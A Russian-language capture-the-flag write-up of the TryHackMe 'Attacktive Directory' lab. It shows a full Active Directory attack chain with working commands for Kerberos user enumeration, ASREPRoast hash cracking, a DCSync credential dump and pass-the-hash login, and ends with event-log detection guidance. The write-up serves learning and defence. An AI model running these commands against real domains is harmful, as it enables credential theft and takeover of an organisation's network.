# Attacktive Directory: ASREPRoast → DCSync за один вечер

**Машина:** [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory) (medium, Windows AD)
**Цепочка:** kerbrute userenum → ASREPRoast → шара backup → secretsdump (DCSync) → pass-the-hash.

## Разведка

nmap показывает полный набор доменного контроллера: 53, 88 (Kerberos), 135, 139, 445, 3389 и куча RPC-портов. Домен — `spookysec.local`, заносим в `/etc/hosts`.

## Юзеры через Kerberos

Kerberos позволяет проверить существование учётной записи по ответу KDC. kerbrute перебирает список имён:

```bash
kerbrute userenum -dc <ip> -d spookysec.local userlist.txt
```

Из найденных двоих выделяется `svc-admin`.

## ASREPRoast

Если у аккаунта стоит «Does not require Pre-Authentication», KDC возвращает AS-REP без предварительного подтверждения знания пароля. Его часть зашифрована ключом, производным от пароля пользователя, и позволяет подбирать пароль офлайн:

```bash
python3 GetNPUsers.py -no-pass -usersfile users.txt -dc-ip <ip> spookysec.local/
hashcat -m 18200 hash.txt passwordlist.txt
```

Хэш svc-admin ломается словарём из комнаты.

## От юзера — до всего домена

Под svc-admin смотрим шары (`smbclient -L`), в нестандартной шаре `backup` лежит текстовик с кредами юзера `backup`. У backup есть права репликации каталога, достаточные для DCSync — получения хэшей доменных учётных записей:

```bash
python3 secretsdump.py spookysec.local/backup:<pass>@<ip>
# метод: DRSUAPI, в выдаче — хэш Administrator
evil-winrm -i <ip> -u Administrator -H <hash>
```

Pass-the-hash, evil-winrm, флаги с десктопов трёх юзеров.

## Как обнаружить

- userenum: волна 4768 с одного source IP и статусом 0x6 (юзера нет). Событие 4771 относится к ошибкам предварительной аутентификации Kerberos, 4776 — к проверке учётных данных через NTLM. Наличие событий зависит от настроек аудита; запросы стоит группировать по источнику.
- ASREPRoast: успешные 4768 без pre-auth требуют проверки. Etype 0x17 означает RC4, но сам по себе не доказывает ASREPRoast; важно различать тип шифрования билета и зашифрованной части ответа.
- DCSync: 4662 на объекте домена с правами Replication Get Changes (GUID 1131f6aa / 1131f6ad) от аккаунта, который не контроллер. Репликация от нестандартного источника требует проверки: её могут выполнять и легитимные службы.
- PtH: 4624 Logon Type 3 с NTLM от аккаунтов, которым положен Kerberos. От легитимного NTLM-логона почти не отличить — в этом и живучесть техники.

## Заметка

Цепочка держится на нескольких проблемах: отключённая pre-auth, подбираемый пароль, доступные в шаре учётные данные и избыточные права репликации у backup. Одна отключённая pre-auth ещё не даёт контроль над доменом.
